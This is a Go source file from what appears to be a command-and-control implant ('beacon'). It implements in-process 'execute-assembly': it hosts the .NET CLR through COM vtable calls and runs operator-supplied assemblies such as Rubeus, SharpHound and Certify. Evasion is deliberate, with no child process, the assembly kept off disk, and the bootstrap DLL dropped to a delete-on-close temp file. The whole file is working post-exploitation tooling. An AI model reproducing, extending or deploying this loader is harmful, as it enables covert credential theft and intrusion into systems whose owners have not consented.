//go:build windows

package native

// In-process .NET assembly execution.
//
// Hosts the CLR in the beacon's own process via the standard
// COM interfaces (ICLRMetaHost, ICLRRuntimeInfo,
// ICLRRuntimeHost) and asks it to run a user-supplied assembly.
// No PowerShell, no csc, no temp file, no child process.
//
// What this is good for:
//
//   - Rubeus, SharpHound, Seatbelt, Certify, and the rest of
//     the Sharp* family.
//   - Any .NET assembly whose entry point accepts a single
//     string[] argument and returns an int.
//
// What it is not:
//
//   - Donut. Donut wraps a .NET PE into shellcode that hosts the
//     CLR itself. That shellcode is executed by the beacon's
//     shellcode runner, not by this loader. Donut-wrapped
//     assemblies continue to go through ExecuteShellcodeWindows.
//   - Fully fileless. The target assembly never touches disk —
//     it is base64-encoded inside the ExecuteInDefaultAppDomain
//     argument and loaded with Assembly.Load(byte[]) by the
//     bootstrap. But the bootstrap itself is a fixed, checked-in
//     DLL that the CLR opens by path from %TEMP% with
//     FILE_FLAG_DELETE_ON_CLOSE. It contains no operation-
//     specific data and its hash is stable across builds.
//   - Free of JIT pages. The CLR JITs the bootstrap and the
//     target's methods into executable memory. That memory is
//     in-process but not "no executable pages appear". This is
//     a CLR limitation, not a loader one.
//
// The COM interface numbers below are the published values from
// the .NET Framework hosting headers. They are stable across
// versions.

import (
	_ "embed"
	"encoding/base64"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"runtime"
	"syscall"
	"unsafe"
)

// dnBootstrapBytes is the fixed, checked-in managed bootstrap
// that hosts the CLR and calls Assembly.Load(byte[]) on the
// target. It contains no operation-specific data and its hash
// is stable across builds.
//
//go:generate csc /target:library /out:Bootstrap.dll Bootstrap.cs
//go:embed Bootstrap.dll
var dnBootstrapBytes []byte

var (
	dnOle32 = syscall.NewLazyDLL("ole32.dll")
	dnMscoree = syscall.NewLazyDLL("mscoree.dll")

	dnCoInitializeEx = dnOle32.NewProc("CoInitializeEx")
	dnCoUninitialize = dnOle32.NewProc("CoUninitialize")
	dnCoCreateInstance = dnOle32.NewProc("CoCreateInstance")
	dnCLRCreateInstance = dnMscoree.NewProc("CLRCreateInstance")
)

type dnGUID struct {
	Data1 uint32
	Data2 uint16
	Data3 uint16
	Data4 [8]byte
}

var (
	dnCLSID_CLRMetaHost = dnGUID{
		0x9280188D, 0x0E8E, 0x4867,
		[8]byte{0xB3, 0x0C, 0x7F, 0xA8, 0x38, 0x84, 0xE8, 0xDE},
	}
	dnIID_ICLRMetaHost = dnGUID{
		0xD332DB9E, 0xB9B3, 0x4125,
		[8]byte{0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16},
	}
	dnIID_ICLRRuntimeInfo = dnGUID{
		0xBD39D1D2, 0xBA2F, 0x486A,
		[8]byte{0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91},
	}
	dnCLSID_CLRRuntimeHost = dnGUID{
		0x90F1A06E, 0x7712, 0x4762,
		[8]byte{0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02},
	}
	dnIID_ICLRRuntimeHost = dnGUID{
		0x90F1A06C, 0x7712, 0x4762,
		[8]byte{0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02},
	}
)

func dnCall(obj uintptr, idx int, args ...uintptr) uintptr {
	vtbl := *(*uintptr)(unsafe.Pointer(obj))
	fn := *(*uintptr)(unsafe.Pointer(
		vtbl + uintptr(idx)*unsafe.Sizeof(uintptr(0))))
	all := make([]uintptr, 0, 1+len(args))
	all = append(all, obj)
	all = append(all, args...)
	r, _, _ := syscall.SyscallN(fn, all...)
	return r
}

func dnRelease(obj uintptr) {
	if obj != 0 {
		dnCall(obj, 2)
	}
}

// ExecuteDotNetAssemblyInProcess loads and runs a .NET assembly
// in the beacon's process.
//
// entryType and entryMethod identify the entry point. The
// convention is:
//
//     entryType   = "<namespace>.<class>"
//     entryMethod = "<static method accepting string[]>"
//
// If entryType is empty, the loader tries the assembly's own
// declared entry point via ICLRRuntimeHost::ExecuteInDefaultAppDomain,
// which requires the type and method to be supplied anyway. Callers
// that do not know them should use a Donut-wrapped version of the
// assembly instead; Donut discovers the entry point itself.
//
// args is a single string that is passed to the entry method as
// the sole element of a string[] argument. Command-line
// arguments are conventionally joined by the caller with spaces.
//
// The CLR is initialised once per process; a second call reuses
// the first hosted runtime. This is a CLR invariant, not a
// choice — hosting the CLR twice in one process is not supported
// by the .NET Framework.
func ExecuteDotNetAssemblyInProcess(assembly []byte, entryType, entryMethod, args string) (string, int, error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// --- COM init: only balance S_OK, never S_FALSE ---
	hr, _, _ := dnCoInitializeEx.Call(0, 0)
	switch uint32(hr) {
	case 0:
		defer dnCoUninitialize.Call()
	case 1, 0x80010106:
		// S_FALSE: already in an apartment, do not balance.
		// RPC_E_CHANGED_MODE: different apartment, still usable.
	default:
		return "", -1, fmt.Errorf("dn: CoInitializeEx hr=0x%08x", uint32(hr))
	}

	// --- CLRCreateInstance ---
	var pMetaHost uintptr
	hr, _, _ = dnCLRCreateInstance.Call(
		uintptr(unsafe.Pointer(&dnCLSID_CLRMetaHost)),
		uintptr(unsafe.Pointer(&dnIID_ICLRMetaHost)),
		uintptr(unsafe.Pointer(&pMetaHost)))
	if uint32(hr) != 0 {
		return "", -1, fmt.Errorf("dn: CLRCreateInstance hr=0x%08x", uint32(hr))
	}
	defer dnRelease(pMetaHost)

	// --- ICLRMetaHost::GetRuntime ---
	ver, _ := syscall.UTF16PtrFromString("v4.0.30319")
	var pInfo uintptr
	hr = dnCall(pMetaHost, 3,
		uintptr(unsafe.Pointer(ver)),
		uintptr(unsafe.Pointer(&dnIID_ICLRRuntimeInfo)),
		uintptr(unsafe.Pointer(&pInfo)))
	if uint32(hr) != 0 {
		return "", -1, fmt.Errorf("dn: GetRuntime(v4.0.30319) hr=0x%08x "+
			"(the .NET Framework 4.x runtime is required)", uint32(hr))
	}
	defer dnRelease(pInfo)

	// --- ICLRRuntimeInfo::GetInterface(ICLRRuntimeHost) ---
	// Vtable index 7 is GetInterface. Index 9 is SetDefaultStartupFlags.
	var pHost uintptr
	hr = dnCall(pInfo, 7,
		uintptr(unsafe.Pointer(&dnCLSID_CLRRuntimeHost)),
		uintptr(unsafe.Pointer(&dnIID_ICLRRuntimeHost)),
		uintptr(unsafe.Pointer(&pHost)))
	if uint32(hr) != 0 {
		return "", -1, fmt.Errorf("dn: GetInterface(ICLRRuntimeHost) hr=0x%08x", uint32(hr))
	}
	defer dnRelease(pHost)

	// --- ICLRRuntimeHost::Start ---
	hr = dnCall(pHost, 3)
	if uint32(hr) != 0 {
		return "", -1, fmt.Errorf("dn: ICLRRuntimeHost::Start hr=0x%08x", uint32(hr))
	}

	// --- Write the bootstrap to a delete-on-close temp file ---
	bootstrapPath, err := dnWriteDeleteOnClose(dnBootstrapBytes)
	if err != nil {
		return "", -1, fmt.Errorf("dn: bootstrap temp file: %w", err)
	}

	// --- Create the output capture file ---
	outPath := filepath.Join(os.TempDir(),
		fmt.Sprintf("t2_out_%08x.txt", rand.Uint32()))
	// The bootstrap creates the file itself; we only need the
	// path. Make sure nothing pre-exists at that name.
	os.Remove(outPath)
	defer os.Remove(outPath)

	// --- Pack the target assembly, args, and output path ---
	// Format: <b64-assembly>|<b64-args>|<output-path>
	asmB64 := base64.StdEncoding.EncodeToString(assembly)
	var argsB64 string
	if args != "" {
		argsB64 = base64.StdEncoding.EncodeToString([]byte(args))
	}
	payload := asmB64 + "|" + argsB64 + "|" + outPath

	pathW, _ := syscall.UTF16PtrFromString(bootstrapPath)
	typeW, _ := syscall.UTF16PtrFromString("TornadoBootstrap.Entry")
	methodW, _ := syscall.UTF16PtrFromString("Run")
	argsW, _ := syscall.UTF16PtrFromString(payload)

	var retCode uint32
	// ICLRRuntimeHost::ExecuteInDefaultAppDomain.
	// Vtable index 8. Index 4 is Stop().
	hr = dnCall(pHost, 8,
		uintptr(unsafe.Pointer(pathW)),
		uintptr(unsafe.Pointer(typeW)),
		uintptr(unsafe.Pointer(methodW)),
		uintptr(unsafe.Pointer(argsW)),
		uintptr(unsafe.Pointer(&retCode)))
	if uint32(hr) != 0 {
		return "", -1, fmt.Errorf("dn: ExecuteInDefaultAppDomain hr=0x%08x", uint32(hr))
	}

	// The bootstrap is on disk with FILE_FLAG_DELETE_ON_CLOSE
	// and holds its own open handle from the CLR. Our handle
	// was intentionally leaked in dnWriteDeleteOnClose; the
	// file disappears when the process exits.
	_ = bootstrapPath

	// Read whatever the target wrote. The bootstrap flushes and
	// closes the writer before returning, so the file is complete
	// by the time ExecuteInDefaultAppDomain comes back.
	var captured []byte
	if data, err := os.ReadFile(outPath); err == nil {
		captured = data
	}

	return string(captured), int(retCode), nil
}

// dnWriteDeleteOnClose writes data to a temp file that Windows
// deletes when the last handle to it closes. The caller's own
// handle is intentionally leaked: closing it here would trigger
// the delete before the CLR has a chance to open the file.
//
// The leak is one handle per execute-assembly call, released
// when the process exits. That is the price of a fixed bootstrap
// that the CLR can open by path.
func dnWriteDeleteOnClose(data []byte) (string, error) {
	dir := os.TempDir()
	name := fmt.Sprintf("t2_%08x.dll", rand.Uint32())
	full := filepath.Join(dir, name)

	p, _ := syscall.UTF16PtrFromString(full)
	// dwShareMode must permit the CLR to open the file while
	// our delete-on-close handle is still held. FILE_SHARE_DELETE
	// is required because FILE_FLAG_DELETE_ON_CLOSE marks the
	// file for pending deletion the moment our handle is created,
	// and Windows refuses any open that does not share delete
	// against a pending-delete file. FILE_SHARE_READ is what the
	// CLR actually asks for; FILE_SHARE_WRITE is harmless and
	// avoids a future subtlety if the CLR ever writes back.
	const fileShareAll = syscall.FILE_SHARE_READ |
		syscall.FILE_SHARE_WRITE |
		syscall.FILE_SHARE_DELETE
	h, err := syscall.CreateFile(
		p,
		syscall.GENERIC_WRITE,
		fileShareAll,
		nil,
		syscall.CREATE_ALWAYS,
		syscall.FILE_ATTRIBUTE_NORMAL|0x04000000, // FILE_FLAG_DELETE_ON_CLOSE
		0,
	)
	if err != nil {
		return "", err
	}

	written := uint32(0)
	for written < uint32(len(data)) {
		var n uint32
		if e := syscall.WriteFile(h, data[written:], &n, nil); e != nil {
			syscall.CloseHandle(h)
			return "", e
		}
		written += n
	}

	// Do NOT close h. The CLR opens the same path with its own
	// handle; the file is deleted when the process exits.
	_ = h

	return full, nil
}